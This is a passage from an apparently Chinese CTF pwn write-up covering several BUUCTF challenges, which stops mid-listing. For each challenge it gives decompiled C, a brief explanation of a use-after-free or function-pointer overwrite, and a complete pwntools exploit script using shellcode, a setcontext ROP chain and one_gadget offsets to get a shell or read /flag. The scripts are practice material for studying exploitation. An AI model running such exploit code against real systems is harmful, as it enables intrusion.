<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">FightDragon</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  _DWORD *ptr; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  v1 = Count++;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) != <span class="number">0</span> )                          <span class="comment">// even</span></span><br><span class="line">  {</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">80</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">9</span>) = <span class="number">4</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line">    *v4 = PrintMonsterInfo;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Mama Dragon Has Appeared!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">8</span>) = <span class="number">50</span>;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">9</span>) = <span class="number">5</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">30</span>;</span><br><span class="line">    *v4 = PrintMonsterInfo;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Baby Dragon Has Appeared!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    *ptr = <span class="number">1</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">42</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v2 = PriestAttack((<span class="type">int</span>)ptr, v4);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    *ptr = <span class="number">2</span>;</span><br><span class="line">    ptr[<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line">    ptr[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr[<span class="number">3</span>] = PrintPlayerInfo;</span><br><span class="line">    v2 = KnightAttack((<span class="type">int</span>)ptr, v4);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Well Done Hero! You Killed The Dragon!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The World Will Remember You As:"</span>);</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%16s"</span>, v5);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And The Dragon You Have Defeated Was Called:"</span>);</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(_DWORD *))*v4)(v4);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nYou Have Been Defeated!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>上面的dragon的大小是0x10，free之后再次<code> v5 = malloc(0x10u);</code>，所以就有了一个uaf，此时再输入v5，然后执行，就相当于是任意地址执行，程序里有一个<code>system('/bin/sh')</code>，任意地址执行这个即可getshell</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./dragon'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25718</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p32(<span class="number">0x8048DBF</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="jarvisoj-calc-exe"><a href="#jarvisoj-calc-exe" class="headerlink" title="jarvisoj_calc.exe"></a>jarvisoj_calc.exe</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"var"</span>) )</span><br><span class="line">    {</span><br><span class="line">      v21 = strtok(<span class="number">0</span>, <span class="string">" "</span>);</span><br><span class="line">      v22 = strtok(<span class="number">0</span>, <span class="string">" "</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v22 == <span class="string">'='</span> )</span><br><span class="line">      {</span><br><span class="line">        nptr = strtok(<span class="number">0</span>, <span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !nptr )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"invalid syntax"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( *nptr == <span class="string">'"'</span> )</span><br><span class="line">        {</span><br><span class="line">          nptra = nptr + <span class="number">1</span>;</span><br><span class="line">          v25 = <span class="built_in">strchr</span>(nptra, <span class="string">'"'</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v25 )</span><br><span class="line">          {</span><br><span class="line">            *v25 = <span class="number">0</span>;</span><br><span class="line">            v2 = sub_804A63E(v21, nptra);</span><br><span class="line">            sub_804A820((<span class="type">void</span> **)dword_804D0B0, v21, (<span class="type">int</span>)v2);</span><br><span class="line">          }</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure>

<p>代码量大，要做长时间的逆向工作，漏洞点出在这里一块，<code>var a = 1</code>， 这是正常的，但是也可以<code>var add = "1"</code>这样，add是一个指针函数，这样子就成功把add的指针内容被赋值成了1，如果调用add这里的指针函数那么就可以成功的任意执行，可以把内容改成shellcode，然后调用即可getshell。</p>
<p>当遇见+的时候就会调用add这里的指针函数，从而成功调用shellcode，同理其他的sub mul这些都可以</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./calc.exe'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27996</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt; '</span></span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'var sub = "'</span> + asm(shellcraft.sh()) + <span class="string">b'"'</span></span><br><span class="line"><span class="built_in">print</span>(p1)</span><br><span class="line">r.sendlineafter(<span class="string">'&gt; '</span>, p1)</span><br><span class="line">r.sendline(<span class="string">'-'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="ciscn-2019-sw-10"><a href="#ciscn-2019-sw-10" class="headerlink" title="ciscn_2019_sw_10"></a>ciscn_2019_sw_10</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0x1F</span> &amp;&amp; heap_ptr[index] )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptr[index]);                      <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>2.27的uaf漏洞，禁用了execve，但是还可以用execveat，<code>read -r line &lt; /flag;echo $line</code>然后用这个来读flag就行</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ciscn_2019_sw_10'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27291</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'what is your name?'</span>, <span class="string">'z1r0'</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size?\n'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'content?\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index ?\n'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index ?\n'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">setcontext_addr = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + libc.search(asm(<span class="string">"syscall\nret"</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b''</span></span><br><span class="line">p1 = p1.ljust(<span class="number">0x68</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x70</span>, <span class="string">b'\x00'</span>) + p64(free_hook&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x88</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0x20000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa0</span>, <span class="string">b'\x00'</span>) + p64(free_hook&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa8</span>, <span class="string">b'\x00'</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">add(<span class="number">0x500</span>, p1)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(free_hook))   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(setcontext_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">"pop rdi\nret"</span>)).__next__(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">    free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">"pop rsi\nret"</span>)).__next__(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line">    <span class="number">0x2000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">"pop rdx\nret"</span>)).__next__(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">"pop rax\nret"</span>)).__next__(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">    libc_base+libc.search(asm(<span class="string">"jmp rsp"</span>)).__next__(), <span class="comment">#: jmp rsp;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r.sendline(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="ciscn-2019-final-10"><a href="#ciscn-2019-final-10" class="headerlink" title="ciscn_2019_final_10"></a>ciscn_2019_final_10</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_CCF</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"rb"</span>);</span><br><span class="line">  fread(ptr, <span class="number">0xC</span>uLL, <span class="number">1uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, ptr, <span class="number">0xC</span>uLL) )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome, MIB Agent."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)v1 &gt; <span class="number">255</span> || !v1 )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Access denied."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>第一个输入肯定是错的，进到第二个else这里</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">oid __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_C0A();</span><br><span class="line">  sub_C57();</span><br><span 